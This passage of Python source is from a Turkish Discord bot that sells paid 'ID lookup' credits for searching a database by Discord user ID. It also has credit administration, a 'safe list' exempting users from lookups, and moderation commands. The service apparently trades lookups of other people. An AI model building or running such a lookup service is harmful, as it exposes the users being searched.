                title="Sonuç Bulunamadı",
                description=f"`{discord_id}` ID'sine sahip kullanıcı bulunamadı!",
                color=0xff0000
            )
            
            embed.add_field(
                name="Önemli Bilgi",
                value="**Kullanıcı bulunamadığı için hakkınız gitmemiştir!**",
                inline=False
            )
            
            if not is_authorized_admin(interaction.user.id):
                embed.add_field(name="Kalan Hak", value=f"**{remaining_credits}** adet", inline=False)
            else:
                embed.add_field(name="Durum", value="Admin - Sınırsız", inline=False)
                
            await send_search_log_to_channel(interaction.user, discord_id, None, success=False)
            
            await interaction.followup.send(embed=embed, ephemeral=True)
            
    except Exception as e:
        await interaction.followup.send(f"Hata: {str(e)}", ephemeral=True)
    finally:
        conn.close()

@bot.tree.command(name="haklarim", description="Kendi hak durumunu görüntüle")
async def my_credits(interaction: discord.Interaction):
    credits = get_credits(interaction.user.id)
    is_admin = is_authorized_admin(interaction.user.id)
    is_verified_user = is_verified(interaction.user.id)
    
    has_auth_role = False
    has_verified_role = False
    try:
        member = interaction.guild.get_member(interaction.user.id)
        if member:
            auth_role = interaction.guild.get_role(AUTHORIZED_ROLE_ID)
            if auth_role and auth_role in member.roles:
                has_auth_role = True
            
            verified_role = interaction.guild.get_role(VERIFIED_ROLE_ID)
            if verified_role and verified_role in member.roles:
                has_verified_role = True
    except:
        pass
    
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="Hak Durumum",
        color=0x9b59b6
    )
    
    if is_admin:
        embed.description = "**Admin** - Sınırsız arama hakkınız var!"
        embed.add_field(
            name="Kullanabileceğiniz Komutlar",
            value="• `/idsorgu` - ID sorgulama\n• `/hakver` - Hak verebilirsiniz",
            inline=False
        )
    elif credits == 99999:
        embed.description = "**Sınırsız Hak** - Sınırsız arama hakkınız var!"
        embed.add_field(
            name="Kullanabileceğiniz Komut",
            value="`/idsorgu` - ID sorgulama",
            inline=False
        )
    elif credits > 0:
        if is_verified_user:
            embed.description = f"**{credits}** adet arama hakkınız var ve doğrulanmışsınız!"
            embed.add_field(
                name="Kullanabileceğiniz Komut",
                value="`/idsorgu` - ID sorgulama",
                inline=False
            )
        else:
            embed.description = f"**{credits}** adet arama hakkınız var ama doğrulanmamışsınız!"
            embed.add_field(
                name="Doğrulama Yapmak İçin",
                value="`/doğrula` komutu ile doğrulama yapmalısınız.",
                inline=False
            )
    else:
        embed.description = "Arama hakkınız yok!"
        embed.add_field(
            name="Hak Almak İçin",
            value=f"Lütfen <@{OWNER_IDS[0]}> ile iletişime geçin.",
            inline=False
        )
    
    embed.add_field(name="Doğrulama", value="Yapıldı" if is_verified_user else "Yapılmadı", inline=True)
    embed.add_field(name="Yetkili Rolü", value="Var" if has_auth_role else "Yok", inline=True)
    embed.add_field(name="Doğrulama Rolü", value="Var" if has_verified_role else "Yok", inline=True)
    embed.add_field(name="Sunucudaki Toplam Hak", value=f"**{total_credits}** adet", inline=True)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="pre", description="Fiyat listesini göster")
async def price_list(interaction: discord.Interaction):
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="HAK FİYAT LİSTESİ DEHŞET",
        color=0x9b59b6
    )
    
    embed.add_field(
        name="DEHŞET Premium Hak Paketleri",
        value=(
            "**1 HAK:**   5 TL\n"
            "**5 Hak:**   20 TL   (5 TL indirim)\n"
            "**10 Hak:**  45 TL   (5 TL indirim)\n"
            "**25 Hak:** 110 TL   (15 TL indirim)"
        ),
        inline=False
    )
    
    embed.add_field(
        name="İletişim",
        value=f"<@{OWNER_IDS[0]}>",
        inline=False
    )
    
    embed.add_field(
        name="Mevcut Hak Durumu",
        value=f"**Sunucuda toplam {total_credits} hak bulunuyor**",
        inline=False
    )
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="boost", description="Boost bilgilerini göster")
async def boost_info(interaction: discord.Interaction):
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="BOOST PAKETLERİ DEHŞET",
        color=0x9b59b6
    )
    
    embed.add_field(
        name="DEHŞET Boost Paketleri",
        value=(
            "**1 BOOST:**   50 HAK\n"
            "**2 BOOST:**   50 HAK\n"
            "**TOPLAM:**    100 HAK\n"
        ),
        inline=False
    )
    
    embed.add_field(
        name="ÖZEL TEKLİF",
        value="@DEHŞET farkıyla en iyisinden zirveye!",
        inline=False
    )
    
    embed.add_field(
        name="İletişim",
        value=f"<@{OWNER_IDS[0]}>",
        inline=False
    )
    
    embed.add_field(
        name="Mevcut Hak Durumu",
        value=f"**Sunucuda toplam {total_credits} hak bulunuyor**",
        inline=False
    )
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="yardim", description="Yardım menüsü")
async def help_command(interaction: discord.Interaction):
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="DEHŞET BOT - TÜM KOMUTLAR",
        description="Aşağıdaki komutları kullanabilirsiniz:",
        color=0x9b59b6
    )
    
    embed.add_field(
        name="**TEMEL KOMUTLAR**",
        value=(
            "`/yetkilendir` - Uygulamayı yetkilendir\n"
            "`/doğrula` - Doğrulama işlemi başlat\n"
            "`/kod` - Doğrulama kodunu onayla\n"
            "`/idsorgu` - ID sorgulama\n"
            "`/haklarim` - Hak durumunu gör\n"
            "`/pre` - Fiyat listesini göster\n"
            "`/boost` - Boost paketlerini göster\n"
            "`!afk [sebep]` - AFK modunu aç"
        ),
        inline=False
    )
    
    if interaction.user.id in OWNER_IDS or is_authorized_admin(interaction.user.id):
        embed.add_field(
            name="**HAK YÖNETİMİ**",
            value=(
                "`/hakver` - Hak ver + rol ver\n"
                "`/haksil` - Tüm hakları sil + rolü al\n"
                "`/haksorgu` - Hak sorgula\n"
                "`/fullsil` - Tüm hakları sıfırla\n"
                "`/sınırsız` - Sınırsız hak ver"
            ),
            inline=False
        )
        
        embed.add_field(
            name="**KULLANICI YÖNETİMİ**",
            value=(
                "`/doğsil` - Doğrulamayı sil\n"
                "`/yetkiliyap` - Admin yap\n"
                "`/yetkilial` - Admin yetkisini al\n"
                "`/listal` - Güvenli listeye ekle\n"
                "`/listkaldır` - Güvenli listeden çıkar\n"
                "`/listegöster` - Güvenli listeyi göster"
            ),
            inline=False
        )
        
        embed.add_field(
            name="**MODERASYON**",
            value=(
                "`/ban` - Kullanıcıyı sunucudan yasakla\n"
                "`/kick` - Kullanıcıyı sunucudan at\n"
                "`/timeout` - Kullanıcıyı sustur (1dk-28gün)\n"
                "`/untimeout` - Susturmayı kaldır\n"
                "`/warn` - Kullanıcıyı uyar\n"
                "`/uyarilar` - Uyarıları görüntüle\n"
                "`/uyarisil` - Uyarıları temizle\n"
                "`/clear` - Mesaj sil (1-100)"
            ),
            inline=False
        )
        
        embed.add_field(
            name="**MESAJLAŞMA**",
            value=(
                "`/dm` - Kullanıcıya DM gönder\n"
                "`/duyuru` - Kanala duyuru gönder\n"
                "`/topludm` - Tüm üyelere DM (sadece owner)"
            ),
            inline=False
        )
        
        embed.add_field(
            name="**ETKİNLİKLER**",
            value=(
                "`/çekiliş` - Çekiliş başlat\n"
                "`/çekilişbitir` - Çekilişi bitir\n"
                "`/anket` - Anket oluştur\n"
                "`/anketbitir` - Anketi bitir"
            ),
            inline=False
        )
        
        embed.add_field(
            name="**ROL MENÜ & İSTATİSTİK**",
            value=(
                "`/rolmenu` - Rol menüsü oluştur\n"
                "`/rolmenuekle` - Menüye rol ekle\n"
                "`/rolmenusil` - Rol menüsünü sil\n"
                "`/istatistik` - Sunucu istatistikleri"
            ),
            inline=False
        )
    
    embed.add_field(
        name="MEVCUT HAK DURUMU",
        value=f"**Sunucuda toplam {total_credits} hak bulunuyor**",
        inline=False
    )
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="hakver", description="Kullanıcıya hak ver")
@app_commands.describe(kullanici="Hak verilecek kullanıcı", miktar="Verilecek hak miktarı")
async def add_credits_command(interaction: discord.Interaction, kullanici: discord.User, miktar: int):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if miktar <= 0:
        await interaction.response.send_message("Geçersiz miktar! 0'dan büyük bir sayı girin.", ephemeral=True)
        return
    
    add_credits(kullanici.id, miktar)
    
    role_added = await add_role_to_user(interaction.guild, kullanici.id, AUTHORIZED_ROLE_ID)
    
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="✅ HAK VERİLDİ",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
    embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}", inline=True)
    embed.add_field(name="➕ Verilen Hak", value=f"```{miktar} adet```", inline=False)
    embed.add_field(name="💰 Kullanıcı Toplam", value=f"```{get_credits(kullanici.id)} adet```", inline=True)
    embed.add_field(name="🏦 Sunucu Toplam", value=f"```{total_credits} adet```", inline=True)
    embed.add_field(name="🎭 Rol Durumu", value="✅ Verildi" if role_added else "❌ Verilemedi", inline=True)
    embed.set_thumbnail(url=kullanici.display_avatar.url)
    embed.set_footer(text="DEHŞET Credit System")
    
    await interaction.response.send_message(embed=embed)
    await send_admin_log("HAK VER", interaction.user, kullanici, f"Verilen: {miktar} hak | Toplam: {get_credits(kullanici.id)}", guild_id=interaction.guild.id)

@bot.tree.command(name="haksil", description="Kullanıcının tüm haklarını sil")
@app_commands.describe(kullanici="Hakları silinecek kullanıcı")
async def remove_credits_command(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id in OWNER_IDS:
        await interaction.response.send_message("Owner'ın haklarını silemezsiniz!", ephemeral=True)
        return
    
    credits_removed = remove_all_credits(kullanici.id)
    role_removed = await remove_role_from_user(interaction.guild, kullanici.id, AUTHORIZED_ROLE_ID)
    
    total_credits = get_total_credits()
    
    if credits_removed:
        embed = discord.Embed(
            title="🗑️ HAKLAR SİLİNDİ",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}", inline=True)
        embed.add_field(name="🏦 Sunucu Toplam", value=f"```{total_credits} adet```", inline=False)
        embed.add_field(name="🎭 Rol Durumu", value="✅ Alındı" if role_removed else "❌ Alınamadı", inline=True)
        embed.set_thumbnail(url=kullanici.display_avatar.url)
        embed.set_footer(text="DEHŞET Credit System")
        
        await interaction.response.send_message(embed=embed)
        await send_admin_log("HAK SİL", interaction.user, kullanici, "Tüm haklar silindi", guild_id=interaction.guild.id)
    else:
        embed = discord.Embed(
            title="❌ HAK BULUNAMADI",
            description=f"{kullanici.mention} kullanıcısının zaten hakkı yok!",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="DEHŞET Credit System")
        await interaction.response.send_message(embed=embed)

@bot.tree.command(name="haksorgu", description="Kullanıcının haklarını sorgula")
@app_commands.describe(kullanici="Hakları sorgulanacak kullanıcı")
async def check_credits_command(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    credits = get_credits(kullanici.id)
    is_admin = is_authorized_admin(kullanici.id)
    is_verified_user = is_verified(kullanici.id)
    
    has_auth_role = False
    has_verified_role = False
    try:
        member = interaction.guild.get_member(kullanici.id)
        if member:
            auth_role = interaction.guild.get_role(AUTHORIZED_ROLE_ID)
            if auth_role and auth_role in member.roles:
                has_auth_role = True
            
            verified_role = interaction.guild.get_role(VERIFIED_ROLE_ID)
            if verified_role and verified_role in member.roles:
                has_verified_role = True
    except:
        pass
    
    total_credits = get_total_credits()
    
    embed = discord.Embed(
        title="Hak Sorgulama",
        description=f"{kullanici.mention} kullanıcısının hak durumu:",
        color=0x9b59b6
    )
    
    if is_admin:
        embed.add_field(name="Yetki", value="Admin", inline=True)
        embed.add_field(name="Arama Hakkı", value="Sınırsız", inline=True)
    elif credits == 99999:
        embed.add_field(name="Yetki", value="Sınırsız Hak", inline=True)
        embed.add_field(name="Arama Hakkı", value="Sınırsız", inline=True)
    else:
        embed.add_field(name="Arama Hakkı", value=f"**{credits}** adet", inline=True)
    
    embed.add_field(name="Doğrulama", value="Yapıldı" if is_verified_user else "Yapılmadı", inline=True)
    embed.add_field(name="Yetkili Rolü", value="Var" if has_auth_role else "Yok", inline=True)
    embed.add_field(name="Doğrulama Rolü", value="Var" if has_verified_role else "Yok", inline=True)
    embed.add_field(name="Sunucudaki Toplam Hak", value=f"**{total_credits}** adet", inline=False)
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="fullsil", description="Tüm kullanıcıların haklarını sıfırla")
async def reset_all_credits_command(interaction: discord.Interaction):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    try:
        reset_count = reset_all_credits()
        
        embed = discord.Embed(
            title="Tüm Haklar Sıfırlandı",
            description=f"**{reset_count}** kullanıcının hakları sıfırlandı!",
            color=0x9b59b6
        )
        embed.add_field(
            name="Korunanlar", 
            value="• Owner\n• Adminler\n• Sınırsız haklılar", 
            inline=False
        )
        embed.add_field(
            name="Etkilenenler", 
            value=f"• {reset_count} normal kullanıcı", 
            inline=False
        )
        
        await interaction.response.send_message(embed=embed)
        await send_admin_log("FULL SİL", interaction.user, interaction.guild, f"{reset_count} kullanıcının hakları sıfırlandı", guild_id=interaction.guild.id)
        
    except Exception as e:
        await interaction.response.send_message(f"Hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="doğsil", description="Kullanıcının doğrulamasını sil")
@app_commands.describe(kullanici="Doğrulaması silinecek kullanıcı")
async def remove_verification_command(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id in OWNER_IDS:
        await interaction.response.send_message("Owner'ın doğrulamasını silemezsiniz!", ephemeral=True)
        return
    
    role_removed = await remove_role_from_user(interaction.guild, kullanici.id, VERIFIED_ROLE_ID)
    
    if remove_verification(kullanici.id):
        embed = discord.Embed(
            title="Doğrulama Silindi",
            description=f"{kullanici.mention} kullanıcısının doğrulaması başarıyla silindi!",
            color=0x9b59b6
        )
        embed.add_field(
            name="Durum",
            value="Kullanıcı artık doğrulanmamış durumda.",
            inline=False
        )
        embed.add_field(
            name="Rol Durumu",
            value="Alındı" if role_removed else "Alınamadı",
            inline=True
        )
        await interaction.response.send_message(embed=embed)
        await send_admin_log("DOĞRULAMA SİL", interaction.user, kullanici, "Doğrulama kaldırıldı", guild_id=interaction.guild.id)
    else:
        embed = discord.Embed(
            title="Hata",
            description=f"{kullanici.mention} kullanıcısı zaten doğrulanmamış durumda!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed)

async def make_admin_command_slash(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id in OWNER_IDS:
        await interaction.response.send_message("Zaten owner'siniz!", ephemeral=True)
        return
    
    make_admin(kullanici.id)
    
    role_added = await add_role_to_user(interaction.guild, kullanici.id, AUTHORIZED_ROLE_ID)
    
    embed = discord.Embed(
        title="Admin Yapıldı",
        description=f"{kullanici.mention} kullanıcısı artık admin!",
        color=0x9b59b6
    )
    embed.add_field(name="Yetkiler", value="• Hak verebilir\n• Tüm komutları kullanabilir", inline=False)
    
    if role_added:
        embed.add_field(name="Rol", value="Verildi", inline=True)
    else:
        embed.add_field(name="Rol", value="Verilemedi", inline=True)
    
    await interaction.response.send_message(embed=embed)
    await send_admin_log("YETKİLİ YAP", interaction.user, kullanici, "Admin yetkisi verildi", guild_id=interaction.guild.id)

async def remove_admin_command_slash(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id in OWNER_IDS:
        await interaction.response.send_message("Kendi yetkinizi alamazsınız!", ephemeral=True)
        return
    
    admin_removed = remove_admin(kullanici.id)
    role_removed = await remove_role_from_user(interaction.guild, kullanici.id, AUTHORIZED_ROLE_ID)
    
    if admin_removed:
        embed = discord.Embed(
            title="Admin Yetkisi Alındı",
            description=f"{kullanici.mention} kullanıcısının admin yetkisi alındı!",
            color=0x9b59b6
        )
        
        if role_removed:
            embed.add_field(name="Rol", value="Alındı", inline=True)
        else:
            embed.add_field(name="Rol", value="Alınamadı", inline=True)
        
        await interaction.response.send_message(embed=embed)
        await send_admin_log("YETKİLİ AL", interaction.user, kullanici, "Admin yetkisi alındı", guild_id=interaction.guild.id)
    else:
        embed = discord.Embed(
            title="Hata",
            description=f"{kullanici.mention} kullanıcısı zaten admin değil!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed)

@bot.tree.command(name="sınırsız", description="Kullanıcıya sınırsız hak ver")
@app_commands.describe(kullanici="Sınırsız hak verilecek kullanıcı")
async def unlimited_credits(interaction: discord.Interaction, kullanici: discord.User):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    give_unlimited_credits(kullanici.id)
    
    role_added = await add_role_to_user(interaction.guild, kullanici.id, AUTHORIZED_ROLE_ID)
    
    embed = discord.Embed(
        title="Sınırsız Hak Verildi",
        description=f"{kullanici.mention} kullanıcısına sınırsız hak verildi!",
        color=0x9b59b6
    )
    embed.add_field(name="Yetkiler", value="• Sınırsız sorgulama\n• Admin komutları YOK", inline=False)
    
    if role_added:
        embed.add_field(name="Rol", value="Verildi", inline=True)
    else:
        embed.add_field(name="Rol", value="Verilemedi", inline=True)
    
    await interaction.response.send_message(embed=embed)
    await send_admin_log("SINIRSIZ HAK", interaction.user, kullanici, "Sınırsız arama hakkı verildi", guild_id=interaction.guild.id)

@bot.tree.command(name="listal", description="Kullanıcıyı güvenli listeye ekle")
@app_commands.describe(kullanici_id="Güvenli listeye eklenecek kullanıcı ID")
async def add_to_safe_list(interaction: discord.Interaction, kullanici_id: str):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici_id in SAFE_LIST:
        await interaction.response.send_message("Bu kullanıcı zaten güvenli listede!", ephemeral=True)
        return
    
    SAFE_LIST.append(kullanici_id)
    save_safe_list()
    
    embed = discord.Embed(
        title="Güvenli Listeye Eklendi",
        description=f"`{kullanici_id}` ID'li kullanıcı artık güvenli listede!",
        color=0x9b59b6
    )
    embed.add_field(
        name="Koruma", 
        value="Bu kullanıcı artık kimse tarafından sorgulanamaz.", 
        inline=False
    )
    
    await interaction.response.send_message(embed=embed)
    await send_admin_log("LİSTE EKLE", interaction.user, interaction.guild, f"ID: {kullanici_id} güvenli listeye eklendi", guild_id=interaction.guild.id)

@bot.tree.command(name="listkaldır", description="Kullanıcıyı güvenli listeden çıkar")
@app_commands.describe(kullanici_id="Güvenli listeden çıkarılacak kullanıcı ID")
async def remove_from_safe_list(interaction: discord.Interaction, kullanici_id: str):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici_id not in SAFE_LIST:
        await interaction.response.send_message("Bu kullanıcı güvenli listede değil!", ephemeral=True)
        return
    
    SAFE_LIST.remove(kullanici_id)
    save_safe_list()
    
    embed = discord.Embed(
        title="Güvenli Listeden Çıkarıldı",
        description=f"`{kullanici_id}` ID'li kullanıcı güvenli listeden çıkarıldı!",
        color=0x9b59b6
    )
    
    await interaction.response.send_message(embed=embed)
    await send_admin_log("LİSTE ÇIKAR", interaction.user, interaction.guild, f"ID: {kullanici_id} güvenli listeden çıkarıldı", guild_id=interaction.guild.id)

@bot.tree.command(name="listegöster", description="Güvenli listeyi göster")
async def show_safe_list(interaction: discord.Interaction):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if not SAFE_LIST:
        embed = discord.Embed(
            title="Güvenli Liste",
            description="Güvenli liste boş!",
            color=0x9b59b6
        )
    else:
        safe_list_text = "\n".join([f"• `{uid}`" for uid in SAFE_LIST])
        embed = discord.Embed(
            title="Güvenli Liste",
            description=f"**{len(SAFE_LIST)}** kullanıcı güvenli listede:\n\n{safe_list_text}",
            color=0x9b59b6
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

async def send_mod_log(action, moderator, target, reason=None, extra_info=None, guild_id=None):
    try:
        if guild_id and guild_id != ALLOWED_LOG_GUILD_ID:
            return
        
        log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
        if not log_channel:
            return
        
        embed = discord.Embed(
            title=f"MOD LOG - {action.upper()}",
            color=0xff6600,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Moderatör", value=f"{moderator.name} ({moderator.id})", inline=True)
        embed.add_field(name="Hedef", value=f"{target.name} ({target.id})" if hasattr(target, 'name') else str(target), inline=True)
        if reason:
            embed.add_field(name="Sebep", value=reason, inline=False)
        if extra_info:
            embed.add_field(name="Ek Bilgi", value=extra_info, inline=False)
        embed.set_footer(text="Moderasyon Log Sistemi")
        
        await log_channel.send(embed=embed)
    except Exception as e:
        print(f"Mod log hatası: {e}")

async def send_admin_log(action, admin, target, extra_info=None, guild_id=None):
    try:
        if guild_id and guild_id != ALLOWED_LOG_GUILD_ID:
            return
        
        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if not log_channel:
            return
        
        color_map = {
            "HAK VER": 0x00ff00,
            "HAK SİL": 0xff0000,
            "FULL SİL": 0xff0000,
            "DOĞRULAMA SİL": 0xffa500,
            "YETKİLİ YAP": 0x00ffff,
            "YETKİLİ AL": 0xff6600,
            "SINIRSIZ HAK": 0x9b59b6,
            "LİSTE EKLE": 0x00ff00,
            "LİSTE ÇIKAR": 0xff6600,
        }
        
        embed = discord.Embed(
            title=f"ADMIN LOG - {action.upper()}",
            color=color_map.get(action.upper(), 0x3498db),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="İşlemi Yapan", value=f"{admin.name} ({admin.id})", inline=True)
        embed.add_field(name="Hedef", value=f"{target.name} ({target.id})" if hasattr(target, 'name') else str(target), inline=True)
        if extra_info:
            embed.add_field(name="Detay", value=extra_info, inline=False)
        embed.set_footer(text="Admin Log Sistemi")
        
        await log_channel.send(embed=embed)
    except Exception as e:
        print(f"Admin log hatası: {e}")

async def ban_user_slash(interaction: discord.Interaction, kullanici: discord.Member, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id == interaction.user.id:
        await interaction.response.send_message("Kendinizi yasaklayamazsınız!", ephemeral=True)
        return
    
    if kullanici.id in OWNER_IDS:
        await interaction.response.send_message("tanriyi nasil banlayabilirimki?", ephemeral=True)
        return
    
    if kullanici.top_role >= interaction.user.top_role and not is_owner(interaction.user.id):
        await interaction.response.send_message("Bu kullanıcıyı yasaklama yetkiniz yok!", ephemeral=True)
        return
    
    try:
        dm_embed = discord.Embed(
            title="🔨 YASAKLANDINIZ",
            description=f"**{interaction.guild.name}** sunucusundan yasaklandınız!",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        dm_embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
        dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
        dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        dm_embed.set_footer(text="DEHŞET Moderation System")
        
        try:
            await kullanici.send(embed=dm_embed)
            dm_sent = True
        except:
            dm_sent = False
        
        await kullanici.ban(reason=f"{interaction.user.name}: {sebep}")
        
        embed = discord.Embed(
            title="🔨 KULLANICI YASAKLANDI",
            color=0xff0000,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
        embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        embed.add_field(name="📩 DM Bildirimi", value="✅ Gönderildi" if dm_sent else "❌ Gönderilemedi", inline=True)
        embed.set_thumbnail(url=kullanici.display_avatar.url)
        embed.set_footer(text=f"Kullanıcı ID: {kullanici.id}")
        
        await interaction.response.send_message(embed=embed)
        await send_mod_log("BAN", interaction.user, kullanici, sebep, guild_id=interaction.guild.id)
        
    except discord.Forbidden:
        await interaction.response.send_message("Bu kullanıcıyı yasaklama yetkim yok!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def kick_user_slash(interaction: discord.Interaction, kullanici: discord.Member, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id == interaction.user.id:
        await interaction.response.send_message("Kendinizi atamazsınız!", ephemeral=True)
        return
    
    if kullanici.top_role >= interaction.user.top_role and not is_owner(interaction.user.id):
        await interaction.response.send_message("Bu kullanıcıyı atma yetkiniz yok!", ephemeral=True)
        return
    
    try:
        dm_embed = discord.Embed(
            title="👢 ATILDINIZ",
            description=f"**{interaction.guild.name}** sunucusundan atıldınız!",
            color=0xffa500,
            timestamp=datetime.datetime.now()
        )
        dm_embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
        dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
        dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        dm_embed.set_footer(text="DEHŞET Moderation System")
        
        try:
            await kullanici.send(embed=dm_embed)
            dm_sent = True
        except:
            dm_sent = False
        
        await kullanici.kick(reason=f"{interaction.user.name}: {sebep}")
        
        embed = discord.Embed(
            title="👢 KULLANICI ATILDI",
            color=0xffa500,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Kullanıcı", value=f"{kullanici.mention}\n`{kullanici.name}`", inline=True)
        embed.add_field(name="🛡️ Yetkili", value=f"{interaction.user.mention}\n`{interaction.user.name}`", inline=True)
        embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        embed.add_field(name="📩 DM Bildirimi", value="✅ Gönderildi" if dm_sent else "❌ Gönderilemedi", inline=True)
        embed.set_thumbnail(url=kullanici.display_avatar.url)
        embed.set_footer(text=f"Kullanıcı ID: {kullanici.id}")
        
        await interaction.response.send_message(embed=embed)
        await send_mod_log("KICK", interaction.user, kullanici, sebep, guild_id=interaction.guild.id)
        
    except discord.Forbidden:
        await interaction.response.send_message("Bu kullanıcıyı atma yetkim yok!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"Hata: {e}", ephemeral=True)

async def timeout_user_slash(interaction: discord.Interaction, kullanici: discord.Member, dakika: int, sebep: str = "Sebep belirtilmedi"):
    if not is_owner(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    if kullanici.id == interaction.user.id:
        await interaction.response.send_message("Kendinizi susturamazsınız!", ephemeral=True)
        return
    
    if dakika < 1 or dakika > 40320:
        await interaction.response.send_message("Süre 1 dakika ile 28 gün arasında olmalı!", ephemeral=True)
        return
    
    if kullanici.top_role >= interaction.user.top_role and not is_owner(interaction.user.id):
        await interaction.response.send_message("Bu kullanıcıyı susturma yetkiniz yok!", ephemeral=True)
        return
    
    try:
        if dakika >= 1440:
            sure_text = f"{dakika // 1440} gün {(dakika % 1440) // 60} saat"
        elif dakika >= 60:
            sure_text = f"{dakika // 60} saat {dakika % 60} dakika"
        else:
            sure_text = f"{dakika} dakika"
        
        dm_embed = discord.Embed(
            title="🔇 SUSTURULDUNUZ",
            description=f"**{interaction.guild.name}** sunucusunda susturuldunuz!",
            color=0xffff00,
            timestamp=datetime.datetime.now()
        )
        dm_embed.add_field(name="⏱️ Süre", value=f"```{sure_text}```", inline=False)
        dm_embed.add_field(name="📋 Sebep", value=f"```{sebep}```", inline=False)
        dm_embed.add_field(name="👤 Yetkili", value=f"{interaction.user.name}", inline=True)
        dm_embed.add_field(name="🏠 Sunucu", value=f"{interaction.guild.name}", inline=True)
        dm_embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
        dm_embed.set_footer(text="DEHŞET Moderation System")
        
        try:
            await kullanici.send(embed=dm_embed)
            dm_sent = True
        except:
            dm_sent = False
        
        duration = datetime.timedelta(minutes=dakika)
        await kullanici.timeout(duration, reason=f"{interaction.user.name}: {sebep}")
        
        embed = discord.Embed(
            title="🔇 KULLANICI SUSTURULDU",
